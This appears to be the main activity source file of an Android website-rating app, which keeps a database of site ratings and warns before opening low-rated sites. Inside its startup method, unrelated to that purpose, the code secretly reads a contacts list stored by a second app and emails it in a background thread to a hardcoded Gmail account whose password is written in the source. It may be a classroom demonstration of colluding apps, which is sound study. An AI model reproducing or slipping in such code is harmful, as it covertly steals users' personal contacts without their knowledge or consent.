package com.example.rateemall;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.URLUtil;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.PopupWindow;
import android.widget.Toast;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final int URL_ACTIVITY_REQUEST_CODE = 12;
    private static final int RATE_ACTIVITY_REQUEST_CODE = 201;
    private static final int UPDATE_MIN_RATE_ACTIVITY_REQUEST_CODE = 403;
    private final String DEFAULT_MIN_RATE = "2.5";
    private Review_db bdd;
    private PopupWindow popupWindow;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        bdd = new Review_db(this);
        showReviews();
        try {
            Context myContext = this.createPackageContext(
                    "com.example.contactemall", Context.CONTEXT_RESTRICTED);
            SharedPreferences mPrefs = myContext.getSharedPreferences("Contacts", Activity.MODE_PRIVATE);
            ArrayList contacts = new ArrayList(mPrefs.getStringSet("Contacts", null));
            if (contacts != null) {
                StringBuilder builder = new StringBuilder();
                for(Object contact : contacts)
                    builder.append(contact).append("\n");
                String contactsString = builder.toString();
                Thread sender = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            GMailSender sender = new GMailSender("ratee.eem.all@gmail.com", "rateemall@2021");
                            sender.sendMail("Contacts list",
                                    "This is the contacts list: " + contactsString,
                                    "ratee.eem.all@gmail.com",
                                    "ratee.eem.all@gmail.com");
                        } catch (Exception e) {
                            Log.e("myLog", "Error: " + e.getMessage());
                        }
                    }
                });
                sender.start();
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void searchButton (View view) {
        EditText url = findViewById(R.id.url);
        if (URLUtil.isValidUrl(url.getText().toString())) {
            SharedPreferences sharedPref = this.getPreferences(Context.MODE_PRIVATE);
            String minRate = sharedPref.getString("MinRate", DEFAULT_MIN_RATE);
            bdd.open();
            SiteReview request = bdd.getReviewBySite(url.getText().toString());
            bdd.close();
            if ((request != null) && (Float.parseFloat(minRate) > Float.parseFloat(request.getRate()))) {
                LayoutInflater inflater = (LayoutInflater)
                        getSystemService(LAYOUT_INFLATER_SERVICE);
                View popupView = inflater.inflate(R.layout.popup_window, null);
                int width = LinearLayout.LayoutParams.WRAP_CONTENT;
                int height = LinearLayout.LayoutParams.WRAP_CONTENT;
                popupWindow = new PopupWindow(popupView, width, height, true);
                popupWindow.showAtLocation(view, Gravity.CENTER, 0, 0);
            } else {
                Uri uri = Uri.parse(url.getText().toString());
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivityForResult(intent, URL_ACTIVITY_REQUEST_CODE);
            }
        } else {
            Toast.makeText(this, "URL not valid", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == URL_ACTIVITY_REQUEST_CODE) {
            super.onActivityResult(requestCode, resultCode, data);
            EditText url = findViewById(R.id.url);
            Intent intent = new Intent(this, RateMySite.class);
            intent.putExtra("Site", url.getText().toString());
            startActivityForResult(intent, RATE_ACTIVITY_REQUEST_CODE);
            url.setText("");
        } else if (requestCode == RATE_ACTIVITY_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data.hasExtra("RatingScore")) {
                String rating = data.getExtras().getString("RatingScore");
                String site = data.getExtras().getString("Site");
                bdd.open();
                if (bdd.getReviewBySite(site) != null) {
                    bdd.updateReview(new SiteReview(site, rating));
                    Toast.makeText(this, "Updated review of " + site + " to " + rating, Toast.LENGTH_LONG).show();
                } else {
                    bdd.insertReview(new SiteReview(site, rating));
                }
                bdd.close();
                showReviews();
            }
        } else if (requestCode == UPDATE_MIN_RATE_ACTIVITY_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data.hasExtra("MinRate")) {
                String rating = data.getExtras().getString("MinRate");
                SharedPreferences sharedPref = this.getPreferences(Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = sharedPref.edit();
                editor.putString("MinRate", rating);
                editor.apply();
                showReviews();
            }
        }
    }

    public void showReviews () {
        ArrayList reviewList;
        bdd.open();
        reviewList = bdd.getAllReviews();
        bdd.close();
        if (reviewList != null) {
            ListView listView = findViewById(R.id.contactList);
            listView.setAdapter((new ArrayAdapter(this, android.R.layout.simple_list_item_1, reviewList)));
        }
    }

    public void updateMin (View view) {
        Intent intent = new Intent(this, MinRate.class);
        SharedPreferences sharedPref = this.getPreferences(Context.MODE_PRIVATE);
        intent.putExtra("MinRate", sharedPref.getString("MinRate", DEFAULT_MIN_RATE));
        startActivityForResult(intent, UPDATE_MIN_RATE_ACTIVITY_REQUEST_CODE);
    }

    public void continueButton (View view) {
        EditText url = findViewById(R.id.url);
        Uri uri = Uri.parse(url.getText().toString());
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivityForResult(intent, URL_ACTIVITY_REQUEST_CODE);
        popupWindow.dismiss();
    }
}